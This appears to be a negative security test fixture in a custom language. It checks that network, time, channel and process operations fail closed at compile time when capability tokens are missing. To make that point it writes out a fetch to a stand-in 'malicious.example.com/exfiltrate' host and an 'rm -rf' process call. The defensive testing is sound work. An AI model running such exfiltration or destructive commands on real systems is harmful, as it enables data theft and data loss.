// # Hostile RTB Capabilities Security Test Fixture
//
// Logline: Proves that invoking RTB effectful operations without passing valid capability tokens fails closed at compile time.
//
// Setup: Hostile entry points attempt unprivileged or cross-capability access across Time, Net, Thread, and Sys domains.
//
// Beats:
//   1. Attempt unauthorized network fetch without &NetCap.
//   2. Attempt unauthorized chrono now_ms / sleep_ms without &TimeCap.
//   3. Attempt unauthorized channel creation without &ThreadCap.
//   4. Attempt unauthorized process execution / project scaffolding without &SysCap.
// RULES.oot 1.4: Default-deny for all ambient side-effects. Explicit capability tokens required.
// RULES.oot 1.7: Under 256 lines.

import "std/time/chrono.oo";
import "std/net/http.oo";
import "std/sync/channel.oo";
import "cli/cli_init.oo";

// Negative Test 1: Network domain unauthorized invocation (violates &NetCap requirement)
pub fn hostile_unauthorized_net_fetch() {
    let unpriv_url: String = "https://malicious.example.com/exfiltrate";
    let res = fetch(unpriv_url);
}

// Negative Test 2: Time domain unauthorized invocation (violates &TimeCap requirement)
pub fn hostile_unauthorized_time_effect() {
    let t = now_ms();
}

// Negative Test 3: Channel/Concurrency domain unauthorized invocation (violates &ThreadCap requirement)
pub fn hostile_unauthorized_channel_effect() {
    let ch = channel_new();
}

// Negative Test 4: System/Process domain unauthorized invocation (violates &SysCap requirement)
pub fn hostile_unauthorized_sys_effect() {
    let r = sys_exec("rm", "-rf", "/tmp/pwn");
}
